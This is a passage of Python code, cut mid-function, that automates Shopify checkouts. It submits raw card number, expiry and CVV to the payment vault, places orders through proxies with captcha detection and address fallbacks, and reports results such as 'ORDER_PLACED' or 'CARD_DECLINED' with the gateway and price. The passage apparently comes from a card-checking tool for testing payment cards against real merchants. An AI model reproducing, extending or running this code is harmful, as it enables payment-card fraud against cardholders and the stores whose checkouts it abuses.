            # --- P4 settlement wait (only touches resp_text; harmless if settled) ---
            try:
                def _p4_factory(qt):
                    try:
                        _p4 = json.loads(json.dumps(del_json_data))
                    except Exception:
                        _p4 = dict(del_json_data)
                        _p4["variables"] = dict(del_json_data.get("variables", {}))
                    _p4["variables"]["queueToken"] = qt or ""
                    if checkpoint_data:
                        _p4["variables"]["checkpointData"] = checkpoint_data
                    return _p4

                _settled_text = await _wait_for_settled_p4(
                    session, graphql_url, headers, _gql_params,
                    _p4_factory, checkout_url, resp_text,
                    max_polls=8, proxy=proxy,
                )
                if _settled_text and _settled_text != resp_text:
                    resp_text = _settled_text
            except Exception as _p4e:
                logger.debug(f"[P4 wait] skipped: {_p4e}")

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            signed_handles = []
            try:
                _d2 = json.loads(resp_text) if resp_text else {}
                _r2 = ((((_d2.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {})
                queueToken = _r2.get('queueToken') or queueToken
                _sp2 = _r2.get('sellerProposal') or {}
                transformer_fingerprint_v2 = _sp2.get('transformerFingerprintV2') or transformer_fingerprint_v2

                _dexp = _sp2.get('deliveryExpectations') or {}
                _seen_handles = set()
                for _el in (_dexp.get('deliveryExpectations') or []):
                    if isinstance(_el, dict) and _el.get('signedHandle'):
                        if _el['signedHandle'] not in _seen_handles:
                            signed_handles.append(_el['signedHandle'])
                            _seen_handles.add(_el['signedHandle'])

                _d_del = _sp2.get('delivery') or {}
                if _d_del.get('__typename') == 'FilledDeliveryTerms':
                    _d_dl = _d_del.get('deliveryLines') or []
                    if _d_dl:
                        _d_strats = _d_dl[0].get('availableDeliveryStrategies') or []
                        _d_sel = _d_dl[0].get('selectedDeliveryStrategy') or {}
                        if _d_sel.get('handle'):
                            delivery_strategy = _d_sel['handle']
                        elif _d_strats:
                            delivery_strategy = _d_strats[0].get('handle', delivery_strategy)
                        if _d_strats:
                            _d_amt = _d_strats[0].get('amount') or {}
                            try:
                                shipping_amount = float(_d_amt.get('value', {}).get('amount') or _d_amt.get('amount') or '0')
                            except (ValueError, TypeError):
                                pass

                _d_tax = _sp2.get('tax') or {}
                if _d_tax.get('__typename') == 'FilledTaxTerms':
                    _d_ta = _d_tax.get('totalTaxAmount') or {}
                    try:
                        tax_amount = float(_d_ta.get('value', {}).get('amount') or _d_ta.get('amount') or '0')
                    except (ValueError, TypeError):
                        pass

                _d_tot = _sp2.get('total') or _sp2.get('runningTotal') or {}
                _d_tot_amt = _d_tot.get('value', {}).get('amount') or _d_tot.get('amount')
                if _d_tot_amt:
                    try:
                        running_total = _d_tot_amt
                        total_price = f"{float(_d_tot_amt):.2f}"
                    except (ValueError, TypeError):
                        pass
            except Exception:
                pass

            # --- payment flexibility terms (additive; only sent when present) ---
            _payment_terms_id = _extract_payment_terms_id(resp_text)

            # --- Vault tokenization ---
            payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None, "start_year": None, "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': _accept_lang,
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': (
                    f'https://checkout.pci.shopifyinc.com/build/{build_id}/number-ltr.html?identifier=&locationURL='
                    if build_id else 'https://checkout.pci.shopifyinc.com/'
                ),
                'User-Agent': _ua,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if _ch_ua:
                vault_headers['sec-ch-ua'] = _ch_ua
                vault_headers['sec-ch-ua-mobile'] = _ch_mobile
                vault_headers['sec-ch-ua-platform'] = _ch_platform
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
                vault_headers['x-checkout-cardsink-caller-identification-signature'] = ident_sig

            token = None
            try:
                vresp = await session.post('https://checkout.pci.shopifyinc.com/sessions',
                                            json=payload, headers=vault_headers)
                _vstatus = vresp.status_code
                _vtext = vresp.text or ""
                try:
                    token_data = json.loads(_vtext) if _vtext.strip() else {}
                except Exception:
                    token_data = {}
                if _vstatus >= 400:
                    _verr = (token_data.get('error') or token_data.get('message')
                             or token_data.get('errors') or _vtext[:120] or f'VAULT_HTTP_{_vstatus}')
                    if isinstance(_verr, (dict, list)):
                        _verr = json.dumps(_verr)
                    return False, str(_verr)[:120], gateway, total_price, currency
                token = token_data.get('id')
            except Exception as _ve:
                return False, f"Vault error: {str(_ve)[:80]}", gateway, total_price, currency

            if not token:
                return False, 'Unable to get payment token', gateway, total_price, currency

            # --- submit_variables construction ---
            cc_clean = cc.strip().replace(" ", "").replace("-", "")
            billing_addr = {'streetAddress': {
                'address1': street, 'address2': address2, 'city': city,
                'countryCode': country_code, 'postalCode': s_zip,
                'firstName': firstName, 'lastName': lastName,
                'zoneCode': state, 'phone': phone
            }}

            if not _requires_shipping:
                _submit_delivery = {
                    'deliveryLines': [{
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True}
                            },
                            'options': {'phone': phone}
                        },
                        'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                        'deliveryMethodTypes': ['NONE'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                }
            else:
                _submit_delivery = {
                    'deliveryLines': [{
                        'destination': {'streetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'company': '', 'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone, 'oneTimeUse': False
                        }},
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {
                                'handle': delivery_strategy or '',
                                'customDeliveryRate': False
                            },
                            'options': {'phone': phone}
                        },
                        'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                        'deliveryMethodTypes': ['SHIPPING', 'LOCAL'],
                        'expectedTotalPrice': {'value': {'amount': str(shipping_amount), 'currencyCode': currency}},
                        'destinationChanged': False
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': True,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                }

            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': _submit_delivery,
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'memberships': {'memberships': []},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': billing_addr,
                                    'cardSource': None
                                },
                                'giftCardPaymentMethod': None,
                                'ownedGiftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': None,
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None
                            },
                            'amount': {'any': True},
                            'dueAt': None
                        }],
                        'billingAddress': billing_addr,
                        'creditCardBin': cc_clean[:8],
                        'allowStoreCredit': False
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'consentState': 'DECLINED', 'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False,
                        'setShippingAddressAsDefault': False
                    },
                    'shopPayArtifact': {'optIn': {
                        'vaultEmail': '', 'vaultPhone': '', 'optInSource': 'REMEMBER_ME'
                    }},
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'captcha': None,
                    'cartMetafields': []
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }

            if signed_handles:
                submit_variables['input']['deliveryExpectations'] = {
                    'deliveryExpectationLines': [{'signedHandle': sh} for sh in signed_handles]
                }
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data

            # --- payment flexibility terms (safe: only when extracted) ---
            if _payment_terms_id:
                submit_variables['input']['paymentFlexibilityPaymentTermsTemplate'] = {
                    'id': _payment_terms_id
                }

            _delivery_retried = [False]

            # --- _addr_fallback_submit (always returns a tuple) ---
            async def _addr_fallback_submit(fb_addr):
                try:
                    _fcc = fb_addr["countryCode"]
                    _fph = fb_addr["phone"]
                    _fst = fb_addr["address1"]
                    _fci = fb_addr["city"]
                    _fzn = fb_addr["zoneCode"]
                    _fzip = fb_addr["postalCode"]

                    _fd = {
                        'query': QUERY_PROPOSAL_SHIPPING,
                        'variables': {
                            'sessionInput': {'sessionToken': sst},
                            'queueToken': queueToken or '',
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'destination': {'partialStreetAddress': {
                                        'address1': _fst, 'address2': address2, 'city': _fci,
                                        'countryCode': _fcc, 'postalCode': _fzip,
                                        'firstName': firstName, 'lastName': lastName,
                                        'zoneCode': _fzn, 'phone': _fph
                                    }},
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True}
                                        },
                                        'options': {}
                                    },
                                    'targetMerchandiseLines': {'any': True},
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                                'supportsSplitShipping': True
                            },
                            'deliveryExpectations': {'deliveryExpectationLines': []},
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stableId or '1',
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                                        }
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                    'lineComponentsSource': None, 'lineComponents': []
                                }]
                            },
                            'payment': {
                                'totalAmount': {'any': True}, 'paymentLines': [],
                                'billingAddress': {'streetAddress': {
                                    'address1': '', 'city': '', 'countryCode': _fcc,
                                    'lastName': '', 'zoneCode': _fzn, 'phone': ''
                                }}
                            },
                            'buyerIdentity': {
                                'customer': {'presentmentCurrency': currency, 'countryCode': _fcc},
                                'email': email, 'emailChanged': False, 'phoneCountryCode': _fcc,
                                'marketingConsent': [{'email': {'value': email}}],
                                'shopPayOptInPhone': {'countryCode': _fcc}, 'rememberMe': False
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                                'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': []
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [],
                                'paymentScriptChanges': [], 'shippingScriptChanges': []
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                            'transformerFingerprintV2': transformer_fingerprint_v2
                        },
                        'operationName': 'Proposal'
                    }
                    if checkpoint_data:
                        _fd['variables']['checkpointData'] = checkpoint_data

                    _, _tp1, _ = await make_graphql_request_with_captcha_handling(
                        session, graphql_url, _gql_params, headers, _fd,
                        checkout_url, max_retries=1, proxy=proxy
                    )
                    _new_strat = delivery_strategy
                    _new_ship = shipping_amount
                    _new_tax = tax_amount
                    _new_queue_token = queueToken
                    _new_handles = list(signed_handles) if signed_handles else []
                    try:
                        _jp1 = json.loads(_tp1)
                        _res1 = (((_jp1.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {}
                        _new_queue_token = _res1.get('queueToken') or queueToken
                        _sell1 = _res1.get('sellerProposal', {})
                        _del1 = _sell1.get('delivery', {})
                        if _del1.get('__typename') == 'FilledDeliveryTerms':
                            _avail1 = (_del1.get('deliveryLines') or [{}])[0].get('availableDeliveryStrategies', [])
                            if _avail1:
                                _new_strat = _avail1[0].get('handle', delivery_strategy)
                                try:
                                    _new_ship = float(_avail1[0].get('amount', {}).get('value', {}).get('amount', '0'))
                                except Exception:
                                    pass
                        _tax1 = _sell1.get('tax', {})
                        if _tax1.get('__typename') == 'FilledTaxTerms':
                            try:
                                _new_tax = float(_tax1.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
                            except Exception:
                                pass
                        _dexp1 = _sell1.get('deliveryExpectations') or {}
                        _extracted_fb = []
                        _seen_fb = set()
                        for _el in (_dexp1.get('deliveryExpectations') or []):
                            if isinstance(_el, dict) and _el.get('signedHandle'):
                                if _el['signedHandle'] not in _seen_fb:
                                    _extracted_fb.append(_el['signedHandle'])
                                    _seen_fb.add(_el['signedHandle'])
                        if _extracted_fb:
                            _new_handles = _extracted_fb
                    except Exception:
                        pass

                    _fd['query'] = QUERY_PROPOSAL_DELIVERY
                    _fd['variables']['queueToken'] = _new_queue_token or ''
                    _fd['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                        'deliveryStrategyByHandle': {'handle': _new_strat or '', 'customDeliveryRate': False},
                        'options': {}
                    }
                    _fd['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                        'lines': [{'stableId': stableId or '1'}]
                    }
                    _fd['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                        'value': {'amount': str(_new_ship), 'currencyCode': currency}
                    }
                    _fd['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
                    _fd['variables']['payment']['billingAddress'] = {'streetAddress': {
                        'address1': _fst, 'address2': address2, 'city': _fci,
                        'countryCode': _fcc, 'postalCode': _fzip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': _fzn, 'phone': _fph
                    }}
                    await make_graphql_request_with_captcha_handling(
                        session, graphql_url, _gql_params, headers, _fd,
                        checkout_url, max_retries=1, proxy=proxy
                    )

                    _fb_bill = {
                        'address1': _fst, 'address2': address2, 'city': _fci,
                        'countryCode': _fcc, 'postalCode': _fzip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': _fzn, 'phone': _fph
                    }
                    _inp = submit_variables['input']

                    _fb_payment = {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {'streetAddress': _fb_bill},
                                    'cardSource': None
                                },
                                'giftCardPaymentMethod': None,
                                'ownedGiftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': None,
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None
                            },
                            'amount': {'any': True},
                            'dueAt': None
                        }],
                        'billingAddress': {'streetAddress': _fb_bill},
                        'creditCardBin': cc_clean[:8],
                        'allowStoreCredit': False
                    }

                    _fb_sv = {
                        'input': {
                            **_inp,
                            'queueToken': _new_queue_token or '',
                            'delivery': {
                                **_inp.get('delivery', {}),
                                'deliveryLines': [{
                                    **(_inp.get('delivery', {}).get('deliveryLines') or [{}])[0],
                                    'destination': {'streetAddress': _fb_bill},
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyByHandle': {
                                            'handle': _new_strat or '', 'customDeliveryRate': False
                                        },
                                        'options': {'phone': _fph}
                                    },
                                    'expectedTotalPrice': {
                                        'value': {'amount': str(_new_ship), 'currencyCode': currency}
                                    }
                                }]
                            },
                            'payment': _fb_payment,
                            'buyerIdentity': {
                                **_inp.get('buyerIdentity', {}),
                                'customer': {'presentmentCurrency': currency, 'countryCode': _fcc},
                                'phoneCountryCode': _fcc,
                                'shopPayOptInPhone': {'number': _fph, 'countryCode': _fcc}
                            },
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': str(_new_tax), 'currencyCode': currency}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': []
                            }
                        },
                        'attemptToken': f"{attempt_token}-fb{random.randint(1000,9999)}",
                        'metafields': [],
                        'analytics': {'requestUrl': checkout_url}
                    }
                    if _new_handles:
                        _fb_sv['input']['deliveryExpectations'] = {
                            'deliveryExpectationLines': [{'signedHandle': sh} for sh in _new_handles]
                        }
                    if checkpoint_data:
                        _fb_sv['input']['checkpointData'] = checkpoint_data
                    else:
                        _fb_sv['input'].pop('checkpointData', None)

                    _fb_submit = {
                        'query': MUTATION_SUBMIT,
                        'variables': _fb_sv,
                        'operationName': 'SubmitForCompletion'
                    }
                    _, _fb_txt, _ = await make_graphql_request_with_captcha_handling(
                        session, graphql_url, _submit_params, headers, _fb_submit,
                        checkout_url, max_retries=1, proxy=proxy
                    )
                    _ft = ''
                    try:
                        _fj = json.loads(_fb_txt)
                        _fsr = _fj.get('data', {}).get('submitForCompletion', {})
                        _ft = _fsr.get('__typename', '')
                        if _ft in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted', 'SubmitSuccessWithReceipt'):
                            return True, 'ORDER_PLACED', gateway, total_price, currency
                        elif _ft == 'SubmitFailed':
                            for _e in _fsr.get('errors', []):
                                _ec = _e.get('code', '')
                                _ed = _e.get('localizedMessage') or _e.get('message', '')
                                if _ec:
                                    return False, _ed or _ec, gateway, total_price, currency
                            return False, 'Submit Failed', gateway, total_price, currency
                        elif _ft == 'SubmitRejected':
                            for _e in _fsr.get('errors', []):
                                _ec = _e.get('code', '')
                                _ed = _e.get('localizedMessage') or _e.get('message', '')
                                _CM = {
                                    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE':
                                        'No delivery available (site ships locally only)',
                                    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE':
                                        'No delivery available (site ships locally only)',
                                    'REQUIRED_ARTIFACTS_UNAVAILABLE': 'Checkout requirements not met',
                                }
                                if _ec in _CM:
                                    return False, _CM[_ec], gateway, total_price, currency
                                if _ec:
                                    return False, _ec, gateway, total_price, currency
                            return False, 'Submit Rejected', gateway, total_price, currency
                    except Exception:
                        pass
                    if _ft:
                        return False, f"Unhandled submit type: {_ft}", gateway, total_price, currency
                    return False, "Unparseable fallback submit", gateway, total_price, currency
                except Exception as e:
                    return False, str(e), gateway, total_price, currency

            # --- _reprop_and_submit ---
            async def _reprop_and_submit():
                nonlocal total_price, running_total, queueToken, checkpoint_data
                try:
                    if not _requires_shipping:
                        _dfd = {
                            'query': QUERY_PROPOSAL_SHIPPING,
                            'variables': {
                                'sessionInput': {'sessionToken': sst},
                                'queueToken': queueToken or '',
                                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                                'delivery': {
                                    'deliveryLines': [{
                                        'selectedDeliveryStrategy': {
                                            'deliveryStrategyMatchingConditions': {
                                                'estimatedTimeInTransit': {'any': True},
                                                'shipments': {'any': True}
                                            },
                                            'options': {}
                                        },
                                        'targetMerchandiseLines': {'any': True},
                                        'deliveryMethodTypes': ['NONE'],
                                        'expectedTotalPrice': {'any': True},
                                        'destinationChanged': True
                                    }],
                                    'noDeliveryRequired': [],
                                    'useProgressiveRates': False,
                                    'prefetchShippingRatesStrategy': None,
                                    'supportsSplitShipping': True
                                },
                                'deliveryExpectations': {'deliveryExpectationLines': []},
                                'merchandise': ship_json_data['variables']['merchandise'],
                                'payment': {
                                    'totalAmount': {'any': True}, 'paymentLines': [],
                                    'billingAddress': {'streetAddress': {
                                        'address1': '', 'city': '', 'countryCode': country_code,
                                        'lastName': '', 'zoneCode': state, 'phone': ''
                                    }}
                                },
                                'buyerIdentity': ship_json_data['variables']['buyerIdentity'],
                                'tip': {'tipLines': []},
                                'taxes': {
                                    'proposedAllocations': None,
                                    'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                                    'proposedTotalIncludedAmount': None,
                                    'proposedMixedStateTotalAmount': None,
                                    'proposedExemptions': []
                                },
                                'note': {'message': None, 'customAttributes': []},
                                'localizationExtension': {'fields': []},
                                'nonNegotiableTerms': None,
                                'scriptFingerprint': {
                                    'signature': None, 'signatureUuid': None,
                                    'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                                    'shippingScriptChanges': []
                                },
                                'optionalDuties': {'buyerRefusesDuties': False},
                                'transformerFingerprintV2': transformer_fingerprint_v2
                            },
                            'operationName': 'Proposal'
                        }
                        _, _dt, _ = await make_graphql_request_with_captcha_handling(
                            session, graphql_url, _gql_params, headers, _dfd,
                            checkout_url, max_retries=1, proxy=proxy
                        )
                        _new_qt = queueToken
                        try:
                            _dj = json.loads(_dt)
                            _dr = (((_dj.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {}
                            _new_qt = _dr.get('queueToken') or queueToken
                            queueToken = _new_qt
                        except Exception:
                            pass
                        _dsv = {
                            'input': {
                                **submit_variables['input'],
                                'queueToken': _new_qt or '',
                                'delivery': {
                                    'deliveryLines': [{
                                        'selectedDeliveryStrategy': {
                                            'deliveryStrategyMatchingConditions': {
                                                'estimatedTimeInTransit': {'any': True},
                                                'shipments': {'any': True}
                                            },
                                            'options': {}
                                        },
                                        'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                                        'deliveryMethodTypes': ['NONE'],
                                        'expectedTotalPrice': {'any': True},
                                        'destinationChanged': True
                                    }],
                                    'noDeliveryRequired': [],
                                    'useProgressiveRates': False,
                                    'prefetchShippingRatesStrategy': None,
                                    'supportsSplitShipping': True
                                },
                            },
                            'attemptToken': f"{attempt_token}-d{random.randint(1000,9999)}",
                            'metafields': [],
                            'analytics': {'requestUrl': checkout_url}
                        }
                        _dsd = {'query': MUTATION_SUBMIT, 'variables': _dsv, 'operationName': 'SubmitForCompletion'}
                        _, _dst, _ = await make_graphql_request_with_captcha_handling(
                            session, graphql_url, _submit_params, headers, _dsd,
                            checkout_url, max_retries=1, proxy=proxy
                        )
                        try:
                            _djr = json.loads(_dst)
                            _dsr = _djr.get('data', {}).get('submitForCompletion', {})
                            _drt = _dsr.get('__typename', '')
                            if _drt in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted', 'SubmitSuccessWithReceipt'):
                                return True, 'ORDER_PLACED', gateway, total_price, currency
                            elif _drt == 'SubmitFailed':
                                _dfr = _dsr.get('reason', 'DECLINED')
                                return False, extract_clean_response(str(_dfr)), gateway, total_price, currency
                            elif _drt == 'SubmitRejected':
                                _de = (_dsr.get('errors') or [{}])[0]
                                _dc = _de.get('code', '')
                                _dm = _de.get('localizedMessage') or _de.get('nonLocalizedMessage') or _dc or 'DECLINED'
                                return False, extract_clean_response(_dm), gateway, total_price, currency
                        except Exception:
                            pass
                        return False, 'CARD_DECLINED', gateway, total_price, currency

                    _fd1 = {
                        'query': QUERY_PROPOSAL_SHIPPING,
                        'variables': {
                            'sessionInput': {'sessionToken': sst},
                            'queueToken': queueToken or '',
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'destination': {'partialStreetAddress': {
                                        'address1': street, 'address2': address2, 'city': city,
                                        'countryCode': country_code, 'postalCode': s_zip,
                                        'firstName': firstName, 'lastName': lastName,
                                        'zoneCode': state, 'phone': phone
                                    }},
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True}
                                        },
                                        'options': {}
                                    },
                                    'targetMerchandiseLines': {'any': True},
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': False
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                                'supportsSplitShipping': True
                            },
                            'deliveryExpectations': {'deliveryExpectationLines': []},
                            'merchandise': ship_json_data['variables']['merchandise'],
                            'payment': {
                                'totalAmount': {'any': True}, 'paymentLines': [],
                                'billingAddress': {'streetAddress': {
                                    'address1': '', 'city': '', 'countryCode': country_code,
                                    'lastName': '', 'zoneCode': state, 'phone': ''
                                }}
                            },
                            'buyerIdentity': ship_json_data['variables']['buyerIdentity'],
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': []
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None, 'signatureUuid': None,
                                'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                                'shippingScriptChanges': []
                            },
                            'optionalDuties': {'buyerRefusesDuties': False}
                        },
                        'operationName': 'Proposal'
                    }
                    _, _tp1, _ = await make_graphql_request_with_captcha_handling(
                        session, graphql_url, _gql_params, headers, _fd1,
                        checkout_url, max_retries=1, proxy=proxy
                    )
                    _new_strat = delivery_strategy
                    _new_ship = shipping_amount
                    _new_tax = tax_amount
                    _new_run = running_total
                    try:
                        _jp1 = json.loads(_tp1)
                        _sell1 = _jp1.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                        _del1 = _sell1.get('delivery', {})
                        if _del1.get('__typename') == 'FilledDeliveryTerms':
                            _avail1 = (_del1.get('deliveryLines') or [{}])[0].get('availableDeliveryStrategies', [])
                            if _avail1:
                                _new_strat = _avail1[0].get('handle', delivery_strategy)
                                try:
                                    _new_ship = float(_avail1[0].get('amount', {}).get('value', {}).get('amount', '0'))
                                except Exception:
                                    pass
                        _tax1 = _sell1.get('tax', {})
                        if _tax1.get('__typename') == 'FilledTaxTerms':
                            try:
                                _new_tax = float(_tax1.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
                            except Exception:
                                pass
                        _rt1 = _sell1.get('runningTotal', {})
                        if isinstance(_rt1, dict):
                            _rta1 = _rt1.get('value', {}).get('amount')
                            if _rta1:
                                _new_run = _rta1
                    except Exception:
                        pass

                    _reprop_json_data = {
                        'query': QUERY_PROPOSAL_DELIVERY,
                        'variables': {
                            'sessionInput': {'sessionToken': sst},
                            'queueToken': queueToken or '',
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'destination': {'streetAddress': {
                                        'address1': street, 'address2': address2, 'city': city,
                                        'countryCode': country_code, 'postalCode': s_zip,
                                        'firstName': firstName, 'lastName': lastName,
                                        'zoneCode': state, 'phone': phone
                                    }},
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyByHandle': {
                                            'handle': _new_strat or '', 'customDeliveryRate': False
                                        },
                                        'options': {}
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'value': {'amount': str(_new_ship), 'currencyCode': currency}},
                                    'destinationChanged': False
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                                'supportsSplitShipping': True
                            },
                            'deliveryExpectations': {'deliveryExpectationLines': []},
                            'merchandise': ship_json_data['variables']['merchandise'],
                            'payment': {
                                'totalAmount': {'any': True}, 'paymentLines': [],
                                'billingAddress': {'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
